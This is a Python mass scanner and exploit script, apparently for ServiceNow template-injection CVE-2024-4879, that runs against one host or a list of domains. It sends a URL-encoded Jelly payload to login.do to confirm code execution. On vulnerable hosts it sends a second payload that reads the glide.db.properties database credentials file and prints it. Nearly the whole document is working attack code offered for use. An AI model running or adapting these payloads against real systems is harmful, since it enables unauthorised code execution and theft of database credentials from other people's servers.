from colorama import Fore
import requests
import argparse
import urllib3
import concurrent.futures

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()

parser.add_argument('-t', '--target',
                   help="target to scan")

parser.add_argument('-f', '--file',
                   help="file to scan")

args = parser.parse_args()

banner = f"""

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██╗  ██╗ █████╗ ███████╗ █████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ██║  ██║██╔══██╗╚════██║██╔══██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗███████║╚█████╔╝    ██╔╝╚██████║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝╚════██║██╔══██╗   ██╔╝  ╚═══██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║           ██║╚█████╔╝   ██║   █████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝           ╚═╝ ╚════╝    ╚═╝   ╚════╝

 {Fore.YELLOW}Author: {Fore.WHITE}c0deninja
 
"""



def check_vuln(url: str) -> str:
    try:
        s = requests.Session()
        if "https://" not in url:
            url = f"https://{url}"
        link = f"{url}/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
        r = s.get(link, verify=False, timeout=10)
        if r.status_code == 200:
            if "1337" in r.text:
                print(f"{Fore.GREEN}[+] {Fore.WHITE}{url}")
                details = f"{url}/login.do?var_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Ez=new%20Packages.java.io.File(%22%22).getAbsolutePath();z=z.substring(0,z.lastIndexOf(%22/%22));u=new%20SecurelyAccess(z.concat(%22/co..nf/glide.db.properties%22)).getBufferedReader();s=%22%22;while((q=u.readLine())!==null)s=s.concat(q,%22%5Cn%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
                details_response = s.get(details, verify=False, timeout=10)
                if details_response == 200:
                    print("\n") 
                    print(details_response.text)    
        else:
            print(f"{Fore.RED}[-] {Fore.WHITE}{url}")
    except requests.exceptions.ConnectTimeout:
        return f"{Fore.YELLOW} ConnectionTimeout for {Fore.GREEN} {url}"
    

def main():
    if args.target:
        check_vuln(args.target)

    if args.file:
        with open(args.file, "r") as f:
            domains = [x.strip() for x in f.readlines()]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(check_vuln, domains)

if __name__ == "__main__":

    print(f"{Fore.YELLOW}{banner}")
    main()

